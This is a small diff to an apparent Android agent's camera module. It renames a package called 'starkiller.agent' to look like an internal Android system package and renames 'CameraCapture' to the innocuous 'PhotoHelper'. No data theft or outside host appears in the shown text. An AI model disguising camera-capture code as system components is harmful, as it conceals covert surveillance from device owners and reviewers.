@@ -1,4 +1,4 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.graphics.ImageFormat
@@ -14,7 +14,7 @@ import org.json.JSONObject
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
-class CameraCapture(private val context: Context) {
+class PhotoHelper(private val context: Context) {
 
     fun capture(facing: String): JSONObject {
         val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
